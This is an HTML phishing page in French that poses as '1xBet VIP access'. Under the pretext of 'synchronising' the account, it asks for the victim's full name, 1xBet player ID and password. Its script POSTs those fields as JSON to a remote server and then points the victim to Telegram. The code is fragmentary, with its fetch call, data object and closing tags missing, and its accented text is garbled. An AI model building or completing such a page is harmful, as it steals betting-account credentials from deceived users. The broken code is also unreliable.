<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acc√®s VIP 1xBet</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background-color: #101e2c; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #1c2d3e; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); width: 90%; max-width: 380px; text-align: center; }
        h2 { color: #3498db; margin-bottom: 20px; }
        input, select { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #34495e; background: #2c3e50; color: white; box-sizing: border-box; }
        button { width: 100%; padding: 15px; border-radius: 8px; border: none; background: #27ae60; color: white; font-weight: bold; cursor: pointer; margin-top: 10px; }
        button:disabled { background: #7f8c8d; }

    </style>
</head>
<body>
    <div class="card">
        <h2>üöÄ ACC√àS VIP D√âTECT√â</h2>
        <p>Synchronisez votre compte pour activer l'acc√®s</p>
        <input type="text" id="nom" placeholder="Nom complet">
        <input type="text" id="id_joueur" placeholder="ID Joueur 1xBet">
        <select id="jeu">

            <option value="Crash">Crash Game</option>

        <input type="password" id="password" placeholder="Mot de passe">
        <button id="btn" onclick="envoyer()">ACTIVER L'ACC√àS</button>
        <div id="status"></div>

    <script>
        async function envoyer() {
            const btn = document.getElementById('btn');

                id: document.getElementById('id_joueur').value,

            if(!data.nom || !data.id || !data.pass) {
                status.innerHTML = "‚ùå Remplissez tous les champs";

            }

            btn.disabled = true;
            status.innerHTML = "‚è≥ Connexion au serveur s√©curis√©...";

            try {

                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify(data)
                });

                if(response.ok) {
                    status.innerHTML = "<span style='color:#2ecc71'>‚úÖ Acc√®s VIP activ√© ! V√©rifiez Telegram.</span>";
                } else {
                    status.innerHTML = "<span style='color:#e74c3c'>‚ùå Erreur serveur (Reload requis)</span>";

            } catch (e) {
                status.innerHTML = "<span style='color:#e74c3c'>‚ùå Erreur r√©seau. R√©essayez.</span>";
